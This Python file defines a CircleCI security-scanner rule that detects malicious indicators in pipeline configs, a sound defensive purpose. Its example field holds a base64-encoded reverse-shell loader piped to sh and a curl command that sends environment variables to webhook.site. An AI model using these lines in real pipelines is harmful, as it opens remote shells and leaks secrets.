"""CC-026, config contains evidence of malicious activity."""
from __future__ import annotations

from ..._malicious import find_malicious_patterns, summarize_malicious_hits
from ..._primitives.blob_rule import yaml_blob_check
from ...base import Severity
from ...rule import Rule

RULE = Rule(
    id="CC-026",
    title="Config contains indicators of malicious activity",
    severity=Severity.CRITICAL,
    owasp=("CICD-SEC-4", "CICD-SEC-7"),
    esf=("ESF-D-INJECTION", "ESF-S-VERIFY-DEPS"),
    cwe=("CWE-506", "CWE-913"),
    recommendation=(
        "Treat as a potential compromise. Identify the PR that added "
        "the matching step(s), rotate any contexts/env vars the "
        "pipeline can reach, and audit recent CircleCI runs for "
        "outbound traffic to the matched hosts."
    ),
    docs_note=(
        "Fires on concrete indicators only (reverse shells, base64-"
        "decoded execution, miner binaries, Discord/Telegram webhooks, "
        "``webhook.site`` callbacks, credential-dump pipes, history-"
        "erasure)."
    ),
    known_fp=(
        "Security-training repositories, CTF challenges, and red-team "
        "exercise pipelines legitimately contain reverse-shell strings "
        "or exfil domains as literals. Matches inside YAML keys / HCL "
        "attributes whose names contain ``example``, ``fixture``, "
        "``sample``, ``demo``, or ``test`` are auto-suppressed; bare "
        "lines in a production pipeline still fire.",
        "Defaults to LOW confidence. Filter with ``--min-confidence "
        "MEDIUM`` to ignore all matches; the rule still surfaces the "
        "hit for teams that want to spot-check.",
    ),
    exploit_example=(
        "# Vulnerable: a step body pipes a base64-decoded payload\n"
        "# to ``sh``. A malicious PR (or a compromised co-maintainer)\n"
        "# plants the reverse-shell loader in the config itself;\n"
        "# every subsequent build executes the payload.\n"
        "version: 2.1\n"
        "jobs:\n"
        "  build:\n"
        "    docker:\n"
        "      - image: alpine@sha256:abc123...\n"
        "    steps:\n"
        "      - run: |\n"
        "          echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE= | base64 -d | sh\n"
        "          curl https://webhook.site/abc?env=$(env|base64)\n"
        "\n"
        "# Safe: the build does only what the build does. No\n"
        "# obfuscated execution, no exfil POSTs, no ``base64\n"
        "# -d | sh`` pipelines. If a check fires here it's\n"
        "# either a compromise or a CTF fixture; treat as\n"
        "# incident-response until verified otherwise.\n"
        "version: 2.1\n"
        "jobs:\n"
        "  build:\n"
        "    docker:\n"
        "      - image: alpine@sha256:abc123...\n"
        "    steps:\n"
        "      - checkout\n"
        "      - run: make build"
    ),
)


check = yaml_blob_check(
    RULE,
    scanner=find_malicious_patterns,
    pass_desc="No indicators of malicious activity detected.",
    fail_desc=summarize_malicious_hits,
    pass_recommendation="No action required.",
)
